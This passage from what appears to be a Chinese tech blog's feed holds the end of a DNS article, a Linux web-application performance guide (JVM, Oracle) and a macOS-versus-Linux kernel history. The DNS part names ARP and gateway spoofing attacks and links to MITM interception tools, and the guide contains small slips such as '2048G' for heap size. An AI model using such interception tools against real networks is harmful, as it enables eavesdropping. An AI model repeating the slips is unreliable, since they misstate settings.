class="line"></span><br><span class="line">	<span class="keyword">for</span> _, txt := <span class="keyword">range</span> txtrecords &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;TXT(文本标识),domain&quot;</span>, domain, <span class="string">&quot;txt&quot;</span>, txt)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ul>
<li><p>重点案例：ARP 与网关欺骗攻击</p>
</li>
<li><p><a href="https://github.com/malfunkt/hyperfox">hyperfox:HTTP/HTTPs MITM proxy and traffic recorder with on-the-fly TLS cert generation. </a></p>
</li>
<li><a href="https://github.com/malfunkt/arpfox">arpfox</a></li>
</ul>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="DNS-Tools"><a href="#DNS-Tools" class="headerlink" title="DNS Tools"></a>DNS Tools</h4><ul>
<li><p>chrome DNS Cache</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 浏览器</span></span><br><span class="line">chrome://net-internals/<span class="comment">#dns</span></span><br><span class="line"><span class="comment"># 清空缓存</span></span><br><span class="line">“clean host cache”</span><br></pre></td></tr></table></figure>
</li>
<li><p>Windows DNS Cache</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看缓存</span></span><br><span class="line">ipconfig /displaydns</span><br><span class="line"><span class="comment"># 清空缓存</span></span><br><span class="line">ipconfig /flushd ns</span><br></pre></td></tr></table></figure>
</li>
<li><p>Mac OS X</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo killall -HUP mDNSResponder</span><br></pre></td></tr></table></figure>
</li>
<li><p>Linux</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 清空DNS缓存，重启 nscd 进程</span></span><br><span class="line">$ /etc/rc.d/init.d/nscd restart</span><br></pre></td></tr></table></figure>
<ul>
<li>网卡流量 nLoad<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://www.roland-riegel.de/nload/nload-0.7.2.tar.gz</span><br><span class="line">tar zxvf nload-0.7.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> nload-0.7.2</span><br><span class="line">./configure</span><br><span class="line">make -j4</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="bond"><a href="#bond" class="headerlink" title="bond"></a>bond</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># modinfo bonding</span></span><br><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-bond0  </span><br><span class="line">DEVICE=bond0</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.1.10</span><br><span class="line">GATEWAY=192.168.1.1</span><br><span class="line">NETMASK=255.255.255.249</span><br><span class="line">USERCTL=NO</span><br><span class="line"></span><br><span class="line">$ more ifcfg-eth0</span><br><span class="line"><span class="comment">#HWADDR=74:86:7A:DD:C3:68</span></span><br><span class="line">DEVICE=eth0</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">ONBOOT=yes</span><br><span class="line">MASTER=bond0</span><br><span class="line">SLAVE=yes</span><br><span class="line">USERCTL=NO</span><br><span class="line"></span><br><span class="line">$ more ifcfg-eth1</span><br><span class="line"><span class="comment">##HWADDR=74:86:7A:DD:C3:69</span></span><br><span class="line">DEVICE=eth1</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">ONBOOT=yes</span><br><span class="line">MASTER=bond0</span><br><span class="line">SLAVE=yes</span><br><span class="line">USERCTL=NO</span><br><span class="line"></span><br><span class="line">more /etc/modprobe.conf</span><br><span class="line">options bonding mode=1 miimon=100</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="性能诊断指南"><a href="#性能诊断指南" class="headerlink" title="性能诊断指南"></a>性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="How-Linux-Works"><a href="#How-Linux-Works" class="headerlink" title="How Linux Works"></a>How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h4 id="案例与实务"><a href="#案例与实务" class="headerlink" title="案例与实务"></a>案例与实务</h4><ul>
<li><a href="https://riboseyim.github.io/2016/07/17/OpenSource-StackOverflow/">最佳工程实践：Stack Overflow 架构 - 2016 Edition</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/Technology-Oracle/">最佳工程实践：Oracle 数据库迁移割接实践</a></li>
<li><a href="https://riboseyim.github.io/2016/09/01/AAA/">最佳工程实践：基于LVS的AAA负载均衡架构实践</a>  </li>
<li><a href="https://code.facebook.com/posts/1906146702752923/open-sourcing-katran-a-scalable-network-load-balancer/">VIPServer | Facebook Open-sourcing Katran, a scalable network load balancer</a></li>
</ul>
<h4 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h4><ul>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">远程通信协议：从 CORBA 到 gRPC</a></li>
<li><a href="https://blog.csdn.net/ch853199769/article/details/78753963">Wireshark 使用技巧</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://tools.ietf.org/html/rfc1035">RFC-1035 DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION</a></li>
<li><a href="https://ops.tips/blog/raw-dns-resolver-in-go">Writing DNS messages from scratch using Go</a></li>
<li><a href="http://man7.org/linux/man-pages/man5/hosts.5.html">hosts - static table lookup for hostnames | Linux Programmer’s Manual</a></li>
<li><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/strace.html">strace 跟踪进程中的系统调用</a></li>
<li><a href="https://zwischenzugs.com/2018/06/08/anatomy-of-a-linux-dns-lookup-part-i/">Anatomy of a Linux DNS Lookup – Part I</a></li>
<li><a href="https://zwischenzugs.com/2018/06/18/anatomy-of-a-linux-dns-lookup-part-ii/">Anatomy of a Linux DNS Lookup – Part II</a></li>
<li><a href="http://www.golangprograms.com/find-dns-records-programmatically.html">Find DNS records programmatically</a></li>
<li><a href="https://medium.com/@owlwalks/build-a-dns-server-in-golang-fec346c42889">Build a DNS server in Golang</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3MDQ4MzQzMg==&amp;mid=2665690630&amp;idx=1&amp;sn=89e75f7fb2910b74b082515b7107222b&amp;chksm=842bba81b35c33978e0d127cf734e4d5c03ed8e15a857f43626b72b1ca9a1024f945e27d7f1f&amp;mpshare=1&amp;scene=1&amp;srcid=0316ZJP9Ue8U7triSRjq4HhK%23rd">网卡收包流程 | 原创 2017-03-16 信鸽工程师Henry 腾讯大数据</a></li>
<li><a href="http://www.vpser.net/manage/nethogs.html">Linux下进程/程序网络带宽占用情况查看工具 — NetHogs</a></li>
<li><a href="http://www.cnblogs.com/peida/archive/2013/03/05/2943698.html">每天一个linux命令（53）：route命令</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 性能诊断:Web 应用性能优化</title>
    <url>/2017/10/24/Linux-Perf-Wan/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>一、常见性能优化要求</li>
<li>二、优化分析过程</li>
<li>三、性能分析工具箱</li>
<li>四、系统基础问题检查<blockquote>
<p>万老师多年前的一篇内部分享，发布出来供有需要的同学参考。虽然今天的应用系统的复杂度跟过去会有所不同，性能观测工具、数据规模也不可以同日而语，但是正所谓一切历史都是当代史（“Ogni storia e la storia contemporanea”），厘清过去的问题是为了更好地理解现在和未来。为了保持原貌，编辑过程中基本遵循原文，之后也不再更新。</p>
</blockquote>
</li>
</ul>
<span id="more"></span>
<h2 id="一、常见性能优化要求"><a href="#一、常见性能优化要求" class="headerlink" title="一、常见性能优化要求"></a>一、常见性能优化要求</h2><p>在我经历的性能优化案例中，常见的问题都是这样开始的：</p>
<ul>
<li>a) 前台访问很慢，请帮忙分析优化</li>
<li>b) 用户对性能很不满意，再不解决就要投诉</li>
<li>c) 数据库负载很重，请帮忙分析一下</li>
<li>d) XXX功能打开需要1分钟，请帮忙分析一下。<br>而等我访问这个功能的时候，可能几秒钟就返回；等你满怀困惑的找到问题提出人员，如果足够幸运的话，可能他告诉你要选择什么查询条件，问题能够重现；当然另一个可能是他也是转述用户的话。</li>
</ul>
<p>在接到这些性能优化要求的时候，我都希望能够了解下面的信息以判断问题的类型，而通常情况下，我的工作都是在这些信息并不存在的情况下开始的</p>
<ul>
<li>a)系统性的问题? 比如CPU利用率，SWAP利用率或者IO过高导致的整体性能下降？</li>
<li>b)功能性问题？ 整体性能良好，个别功能时延很长</li>
<li>c)新出现问题？什么时候开始的，之前系统有哪些变动？（升级或者管理的资源大量增加）</li>
<li>d)不规律问题？有时候快，有时候慢，没有特定规律</li>
<li>还有性能快慢的衡量标准是什么？原来多少秒，现在多少秒，目标是多少秒？</li>
</ul>
<p>只有上述问题得到了准确的回答，优化工作才能开始。</p>
<p>而获取上述答案的方法就是测量，有可靠的监控工具对用户的访问时延，系统的CPU,IO,SWAP进行准确的测量，当系统发生性能瓶颈时，系统当时的状态，数据库当时的状态进行及时的记录，依赖这些数据才能开始优化。</p>
<blockquote>
<p>案例1，天津客户曾经有过投诉，系统经常性的出现整体性能下降，几乎无法访问的情况，而且发生的时间没有任何规律。</p>
</blockquote>
<p>我部署了监控工具，3周后分析数据，发现访问性能下降之前用户都执行了某一个历史告警查询，而在此之后的数据库性能曲线也急剧下降。研发人员对此功能优化后，问题再也没有出现。</p>
<blockquote>
<p>案例2，南京客户某主机经常崩溃，根据监控工具在崩溃前记录的进程列表看，是某个程序挂起导致的进程越积越多，资源耗尽而崩溃，对该程序改进后，故障再未发生。</p>
</blockquote>
<p>之所以费这么多笔墨，就是希望能够让各位明白，没有定量的测量，性能优化工作完全是空中楼阁，无法进行。而通过工具的部署和监测，今后我们提出的性能问题可能就是这样：</p>
<ul>
<li>a) 系统整体负载正常，但/nms/res/devicelist_down.jsp目前经常出现35046毫秒的访问时延，请协助排查一下</li>
<li>b) 系统SWAP利用率经常会超过50%，这时候系统响应很慢，杀掉GetCGFlux.pl后恢复正常，请分析一下</li>
<li>c) 或者数据库服务器目前CPU利用率居高不下，已经持续了一段时间，请分析一下</li>
</ul>
<p>如果性能优化工作以这样的方式开始的话，这项工作就会变得轻松有趣得多了。</p>
<h2 id="二、优化分析过程"><a href="#二、优化分析过程" class="headerlink" title="二、优化分析过程"></a>二、优化分析过程</h2><ol>
<li>性能数据收集<br>  这一步是性能优化的基础，如果问题系统之前没有部署监控工具的话，那么就要部署监控工具，收集一段时间的数据后才能开始分析；当然也有例外，幸运的话，性能问题正在发生并且如此显著，比如某个程序长时间无法挂起，或者某个进程把整台主机的CPU都吃掉，或者某个功能查询很慢,次次如此。当然这种问题也就很少需要到我这，你就可以直接找开发人员解决了。<br>  很多情况，问题可能不是那么明显，也不是那么规律，可能也涉及到系统的多项功能，这个时候，我们就必须要借助于工具来进行数据的收集。</li>
<li>性能数据分析<br>  如果没有数据收集，分析工作可能很神秘，完全依赖于专家的个人经验。以前听过一个故事，一个工厂的打印机总是莫名其妙的在某个时间出现故障，后来请了一个专家，搬了把椅子坐在打印机附近，几个星期后，叫工人把地板的某个角修好，之后这个问题再也没有出现。<br>  但是有了之前收集的数据，观察CPU，IO，应用时延，网络性能等不同指标的曲线，观察问题出现的时间点，存在问题的功能，任何一个IT业者，都应该具备从这些数据中发现问题的能力。<br>例如某台采集机SYSLOG处理经常出现会滞后的情况。而这台机器的网络丢包是这个样子的，那么问题是不是显而易见？</li>
</ol>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LPM_Wan_1.png" alt=""></p>
<p>再比如有一个巡检功能，数据某个时段总是大量入库失败，那你看到数据库CPU和连接数在这个时段是这样的，数据库连接数增加，CPU空闲率为0，那么是不是问题也很明显了。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LPM_Wan_2.png" alt=""></p>
<ol>
<li>实施优化工作<br>  这一步主要是针对之前发现的问题，采取措施。可能是系统维护人员调整采集负载，让负荷更均匀；或者调整主机或数据库参数；当然更多的可能是程序需要优化</li>
<li>评估优化效果<br>  譬如上述第二个例子，采取优化措施后，无论是网络连接数还是数据库主机负载，都已经很平稳，而问题也不再出现。</li>
</ol>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LPM_Wan_3.png" alt=""></p>
<p>如果没有达到，则不断重复上述四步，继续优化。</p>
<h2 id="三、性能分析工具箱"><a href="#三、性能分析工具箱" class="headerlink" title="三、性能分析工具箱"></a>三、性能分析工具箱</h2><p>这个工具箱是我常用的性能分析工具，曾协助我解决了很多的性能优化难题</p>
<ul>
<li>a) web访问时延监控工具AssayFilter<br>   部署在主应用上<br>   部署后可以在resin/logs/AssayFilter.log里面看到访问时间，访问的用户，访问的URL，时延毫秒，来源IP，据此我们就可以将用户的感知定量化，数据化<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">20150227094607 zengguojin /nms/res/devicelist_down.jsp 309356 219.159.77.116 ms</span><br><span class="line">20150209113913 zengguojin /nms/res/devicelist_down.jsp 383042 219.159.77.116 ms</span><br></pre></td></tr></table></figure>
   从这两条数据里我们可以知道这个用户在访问这个功能时候遭遇过多次等待300多秒的情况,他又会有怎样的满意度呢？<br>   针对这个工具可能有人怀疑是否准确，是否统计时延过高是网络延迟导致。这里解释一下他的工作机制，<br>如下图：     </li>
</ul>
<p>AssayFilter作为一个拦截器，统计的是访问请求进入resin之后和应答离开resin之前的时长，访问时延=resin处理时长+主应用到数据库网络时延+oracle的SQL执行时长</p>
<p>主应用到数据库都在一个交换机上，所以主应用到数据库网络时延可以忽略不计。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LPM_Wan_4.png" alt=""></p>
<p>所以，这个工具完全避免了网络延迟对访问时延统计的影响，让我们的精力完全聚焦在WEB应用自身的性能上.</p>
<ul>
<li><p>b) 主机监控探针wd_probe<br>   部署在主机上<br>   这个监控探针除了能起到主机告警通知的作用，也是一个我依赖的性能分析工具，他能够记录各个时间点的CPU,SWAP,磁盘IO,网络性能，进程数量，网络连接数量的性能数据，当CPU超过预设阀值时会输出系统当时的进程快照用于事后的分析。<br>   在探针主目录的data/perf下有性能数据，在data/tmp下有系统进程快照</p>
</li>
<li><p>c) 数据库超长SQL收集工具<br>   部署在主应用上，可以在cron里每分钟执行一次<br>   这个程序会不断捕捉执行时间超过6秒的sql,记录进 /tmp/sql.csv文件中，运行结果如下：<br>   从发起端看可分为两类，通常从APP发起的JDBC程序就是用户前台访问执行的SQL,而这种SQL执行时间超过6秒就是我们需要优化的SQL.</p>
</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LPM_Wan_5.png" alt=""></p>
<h2 id="四、系统基础问题检查"><a href="#四、系统基础问题检查" class="headerlink" title="四、系统基础问题检查"></a>四、系统基础问题检查</h2><ol>
<li>主机基础故障问题</li>
</ol>
<ul>
<li>磁盘空间是否空闲为0？</li>
<li>SWAP利用率是否超过40%?</li>
<li>CPU利用率是否长时间超过85%？</li>
<li>网络是否持续丢包？</li>
<li>工作磁盘IO的利用率是否持续100%?<br>上述状况通常意味着系统有较严重问题，需要进一步从程序或者数据库上查找原因。</li>
</ul>
<ol>
<li>resin的JVM检查<br>Web应用的前台程序jsp和class都是运行在resin的JVM里，JVM(Java虚拟机)类似于oracle数据库，jsp和class类似于SQL,都可以看作一个系统软件，那么仅仅是看java进程在不在，前台能不能访问是不够的。就像没有sqlplus,PLSQL我们就无法维护数据库，同样的JVM也有相应的维护工具,，都在JAVA_HOME/bin下</li>
</ol>
<ul>
<li>a. 查看JVM的内存占用情况</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jstat -gcutil &lt;pid&gt; 3s <span class="number">5</span>       </span><br></pre></td></tr></table></figure>
<pre><code> 这条命令间隔3秒钟查看JVM的内存利用率，取样5次，
 S0     S1     E      O      P     YGC     YGCT    FGC    FGCT     GCT  
 0.00  98.51  44.95  39.41  63.43      9    0.070     2    0.195    0.266
 永久内存区利用率63.43%, Elden和old区分别是44.95%和39.41%
</code></pre><ul>
<li>b. 查看JVM的堆栈调用情况<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jstack &lt;pid&gt;</span><br></pre></td></tr></table></figure>
这条命令把当前JVM里所有的线程调用堆栈输出。在前台访问无响应的时候，排查故障根源时特别有用。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LPM_Wan_6.png" alt=""></p>
<p>上述Thread-831被38f06e88的线程所阻塞，而根据调用堆栈，可以准确的定位到执行程序，进行排查。</p>
<ul>
<li>c. 查看错误日志是否有内存溢出错误<br>日志在resin/logs/error.log或者resin/log/jvm-default.log<br>如果有java.lang.OutOfMemoryError: PermGen space 说明JVM的永久内存区不足<pre><code>          -XX:MaxPermSize=256m     可根据永久内存区利用率调整到256M
         java.lang.OutOfMemoryError说明JVM的堆内存不足
         -Xmx2048m -Xms2048m     把堆内存调大到2048G
</code></pre>如果把Xmx加到2G，仍然会出现上述错误，那可能是有内存泄漏，需要开发人员排查</li>
</ul>
<ol>
<li>数据库检查<br>oracle排查比较复杂，我只能从两方面简单举几个例子。</li>
</ol>
<ul>
<li>a) 系统参数层面优化<br>  1) sga是否充分利用了系统内存，sga可以配系统内存的一半. 而我遇到过主机64G内存，sga_target设置为5G<br>  2) db_cache_size最好在sga_target-3G，因为我们的程序很多没有使用绑定变量,如果不设置db_cache_size,则渐渐的SGA都有被share_pool占用的趋势，数据被缓存的越来越少，获取数据需要从磁盘读取，这样整体性能肯定会下降。<br>  3) shared_servers设置为0，让数据库运行在专有模式而不是共享服务器模式<br>  虽然系统参数调整会在整体上带来一定的性能改善，但相比于糟糕的SQL或者程序设计以及失效的索引和过期的统计数据对性能起到的作用，还是很有限的。</li>
<li>b) 应用优化层面<br>   1) 定位问题SQL<pre><code>   这个SQL能够列出数据库当前正在执行的所有SQL,
</code></pre><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> s.sid,s.serial#,s.blocking_session,p.spid PID,to_char(s.logon_time,<span class="string">&#x27;YYYY-MM-DD HH24:MI:SS&#x27;</span>) logontime ,</span><br><span class="line">substr(s.machine,<span class="number">1</span>,<span class="number">15</span>) smachine,substr(s.program,<span class="number">1</span>,<span class="number">20</span>) sprogram,q.sql_id,substr(q.sql_text,<span class="number">1</span>,<span class="number">200</span>) <span class="keyword">sql</span> <span class="keyword">from</span> v$<span class="keyword">sql</span> q,v$session s,v$process p</span><br><span class="line"><span class="keyword">where</span> q.hash_value<span class="operator">=</span>s.sql_hash_value <span class="keyword">and</span> q.address<span class="operator">=</span>s.sql_address  <span class="keyword">and</span> p.addr<span class="operator">=</span>s.paddr</span><br></pre></td></tr></table></figure>
  基于两个判断标准我们能很快的找到问题SQL<ul>
<li>第一种是某个进程执行的SQL占用的CPU非常高，CPU利用率从Top命令获得，进程ID即PID</li>
<li>第二种是某类进程执行的SQL非常多，单个CPU不高，但合并起来就非常高了。<br>  针对SQL就可以找支撑人员进一步判断是否需要找开发人员优化。<ul>
<li>2) 是否存在session被其他session阻塞的情况<br>  查看上一SQL结果的blocking_session字段，如果被阻塞的进程都被某一会话锁定，需要把该session杀掉<br>  alter system kill session ‘sid,serail#’;<br>  遇到过几次系统非常慢的情况，经查看都是开发或者维护用plsql把某表锁住，导致相关会话都被阻塞</li>
<li>3) 对该SQL所涉及的表进行表分析，更新其统计信息</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>性能优化非常精深，很多东西我也在学习，先把经常出现的一些问题解决经验总结出来，供大家分享。</p>
<h2 id="扩展阅读：电子书《Linux-Perf-Master》"><a href="#扩展阅读：电子书《Linux-Perf-Master》" class="headerlink" title="扩展阅读：电子书《Linux Perf Master》"></a>扩展阅读：电子书《Linux Perf Master》</h2><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Load/">Linux 性能诊断:负载评估</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断:快速检查单</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（一）：启动</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（二）：空间管理</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：内存管理</a></li>
<li><a href="https://riboseyim.github.io/2018/01/08/Linux-Works-Network/">操作系统原理 | How Linux Works（四）：网络管理</a></li>
</ul>
<h2 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h2><ul>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>谁是王者：macOS vs Linux Kernels ？</title>
    <url>/2017/12/19/Linux-Win-Mac/</url>
    <content><![CDATA[<ul>
<li>谁是王者：macOS vs Linux Kernels ？</li>
<li>Mac 快键键</li>
</ul>
<span id="more"></span>
<h2 id="谁是王者：macOS-vs-Linux-Kernels-？"><a href="#谁是王者：macOS-vs-Linux-Kernels-？" class="headerlink" title="谁是王者：macOS vs Linux Kernels ？"></a>谁是王者：macOS vs Linux Kernels ？</h2><p>有些人可能认为 macOS 和 Linux 内核是类似的系统, 因为它们看起来可以处理类似的命令和软件。有些人甚至认为苹果的 macOS 是基于 Linux 的。事实上, 这两个内核各有特色，也都有不同寻常的历史。          </p>
<h2 id="macOS-Kernel-简史"><a href="#macOS-Kernel-简史" class="headerlink" title="macOS Kernel 简史"></a>macOS Kernel 简史</h2><p>我们首先从 macOS Kernel 的历史开始讲起。1985年, 史蒂夫·乔布斯（ Steve Jobs）离开苹果公司（Apple ）并创办了一家新的计算机公司：<strong>NeXT</strong> 。乔布斯快速向市场推出了一款新型电脑 (搭载新操作系统) 。为了节省时间, NeXT 团队使用了 Mach kernel（ 来自卡内基·梅隆大学，是最早实现微核心操作系统的例子之一，是许多其它相似的项目的标准，在分布式与并行运算领域应用广泛) 和 部分 BSD 代码库, 创建了 NeXTSTEP 操作系统。具有讽刺意味的是，早期 Mach 只是服务于操作系统研究，曾经的开发目标甚至是取代 BSD ，目前 Mach 的研究至今似乎是停止了，但是许多商业化操作系统，特别是 Mac OS X  及其它派生系统却活得很滋润。</p>
<p>在商业上，NeXT 公司从来没有获得成功, 部分原因是乔布斯的花钱习惯仍然像他在苹果公司一样大手大脚。与此同时, 苹果公司多次尝试更新自己的操作系统, 但是包括与 IBM 合作在内、一直未取得成功。1997年, 苹果公司以 4 亿 2900 万美元收购了 NeXT 公司 。作为交易的一部分, 史蒂夫·乔布斯重新回到苹果, NeXTSTEP 操作系统也成为了 macOS 和 iOS 操作系统的基础。值得注意的是，NeXT  团队的另一项成果 WebObjects 后来集成到了 Mac OS X Server 和 Xcode 中。</p>
<h2 id="Linux-Kernel-简史"><a href="#Linux-Kernel-简史" class="headerlink" title="Linux Kernel 简史"></a>Linux Kernel 简史</h2><p>与 macOS Kernel 不同, Linux 从一开始不是作为商业计划的一部分而创建的。相反, Linux 在 1991 年由芬兰计算机专业的学生林纳斯·托瓦兹（Linus Torvalds）创建。最初 Linux 内核代码是按照林纳斯个人的计算机规格编写, 因为他想利用自己电脑上搭载的新式 80386 处理器。林纳斯在 1991 年 8 月将他编写的操作系统内核代码发布到网络上。不久, 他收到了来自世界各地爱好者贡献的代码和建议。第二年, <a href="美国黑客, 生于康涅狄格州, 在北卡罗来纳州杜克大学获得电气工程和计算机科学学位，曾在柯达和微软任职">Orest Zborowski </a> 将 X Windows 系统移植到 Linux 中, 使其能够支持图形用户界面。</p>
<p>在过去的 27 年里, Linux 已经慢慢成长壮大，它不再是一个学生的业余项目。目前，Linux 运行在世界上大多数的计算设备和超级计算机上。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/History_macOS_Linux.png" alt=""></p>
<blockquote>
<p>他在旧版的SketchPad代码基础上进行了修改，让它运行在Macintosh上，并改名MacSketch。SketchPad通过菜单的方式选取图案和样式，Bill把它们放到屏幕下方，变成固定的调色板，并在屏幕左边另外增加一组调色板，包含了各种各样的绘图工具。后续还会不断增加新的工具，不过MacPaint早期的基本架构已经就此成形。<br>—— 《硅谷革命：成就苹果公司的疯狂往事》</p>
</blockquote>
